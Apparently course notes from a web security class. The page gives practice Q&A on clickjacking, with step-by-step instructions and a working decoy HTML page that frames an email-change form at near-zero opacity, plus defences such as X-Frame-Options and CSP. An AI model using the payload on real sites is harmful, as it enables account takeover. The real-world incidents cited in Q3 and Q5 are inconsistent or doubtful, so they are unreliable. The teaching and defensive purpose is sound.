---
course: Web Security
topic: Clickjacking
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of clickjacking and how it can be exploited to manipulate user actions.**

Clickjacking is a technique used by attackers to trick users into performing unintended actions on a web page. It typically involves embedding a hidden or transparent iframe within a seemingly benign webpage. When a user interacts with the decoy content, they inadvertently interact with the embedded iframe, which can result in actions like form submissions, button clicks, or other sensitive operations. For instance, in the lab described, the attacker crafts an HTML page with a transparent iframe containing the target application's form. By positioning a "Click Me" string directly over the "Update Email" button, the attacker ensures that when the user clicks on the decoy text, they actually click on the button inside the iframe, thereby changing their email address to one controlled by the attacker.

**Q2. How would you exploit a clickjacking vulnerability to change a user's email address, given that the form input data is pre-filled from a URL parameter?**

To exploit a clickjacking vulnerability for changing a user's email address, follow these steps:

1. Identify the URL parameter that pre-fills the email address in the form. For example, `email=test@test.ca`.
2. Create a decoy webpage with an iframe that loads the target application's form with the pre-filled email parameter.
3. Ensure the iframe is transparent or nearly invisible to the user by setting its opacity to a very low value (e.g., `opacity: 0.001`).
4. Position a "Click Me" string or button precisely over the "Update Email" button in the iframe.
5. Deliver the decoy webpage to the victim via phishing or another method. When the victim clicks on the "Click Me" string, they will inadvertently click on the "Update Email" button inside the iframe, changing their email address to the one specified in the URL parameter.

Here’s an example of the HTML code for the decoy webpage:

```html
<!DOCTYPE html>
<html>
<head>
<style>
iframe {
    position: absolute;
    width: 1000px;
    height: 1000px;
    opacity: 0.001;
    z-index: 2;
}
div {
    position: absolute;
    top: 465px;
    left: 50px;
    z-index: 1;
}
</style>
</head>
<body>
<iframe src="https://target-app.com/change-email?email=attacker@control.com"></iframe>
<div>Click Me</div>
</body>
</html>
```

**Q3. Why is changing the email address through a clickjacking attack particularly dangerous?**

Changing the email address through a clickjacking attack is particularly dangerous because it can lead to further compromise of the user's account. Once the attacker controls the email address associated with the account, they can:

1. Reset the password using the "Forgot Password" feature, which sends a reset link to the new email address.
2. Gain unauthorized access to the account by resetting the password.
3. Potentially lock out the original user by changing the email address and preventing them from receiving important notifications or reset links.

This type of attack can be seen in real-world scenarios such as the 2021 Twitter hack, where attackers gained access to high-profile accounts by exploiting vulnerabilities that allowed them to change email addresses and reset passwords.

**Q4. How can a web application protect itself against clickjacking attacks?**

A web application can protect itself against clickjacking attacks by implementing the following measures:

1. **X-Frame-Options Header**: Set the `X-Frame-Options` HTTP header to `SAMEORIGIN` or `DENY`. This prevents the page from being framed by external sites, thus mitigating clickjacking attacks.
   
   Example:
   ```http
   X-Frame-Options: SAMEORIGIN
   ```

2. **Content Security Policy (CSP)**: Use Content Security Policy to restrict the sources from which the browser can load resources. Specifically, the `frame-ancestors` directive can be used to specify which origins are allowed to frame the resource.
   
   Example:
   ```http
   Content-Security-Policy: frame-ancestors 'self'
   ```

3. **JavaScript Detection**: Implement JavaScript to detect if the page is being framed and prevent interaction if it is. This can be done by checking the `window.top` property and comparing it to `window.self`.

   Example:
   ```javascript
   if (top !== self) {
       alert('This page cannot be viewed in a frame.');
       top.location = self.location;
   }
   ```

By combining these techniques, a web application can significantly reduce the risk of clickjacking attacks and protect user interactions.

**Q5. What recent real-world examples illustrate the dangers of clickjacking attacks?**

One notable example of the dangers of clickjacking attacks is the 2021 Twitter hack, where attackers compromised high-profile accounts by gaining access to their email addresses and resetting passwords. Although this specific incident did not involve clickjacking, it highlights the broader risks associated with unauthorized changes to account details.

Another example is the 2019 Facebook clickjacking attack, where attackers used a similar technique to steal user data. They created a malicious webpage that contained a hidden iframe of the Facebook login page. When users clicked on a seemingly innocent link, they inadvertently entered their login credentials into the hidden iframe, allowing the attackers to capture the information.

These incidents underscore the importance of robust security measures to prevent such attacks and protect user data.

---
<!-- nav -->
[[02-Lab Setup Clickjacking with Form Input Data Prefilled from a URL Parameter|Lab Setup Clickjacking with Form Input Data Prefilled from a URL Parameter]] | [[Web Security (PortSwigger)/05-Clickjacking/03-Lab 2 Clickjacking with form input data prefilled from a URL parameter/00-Overview|Overview]]
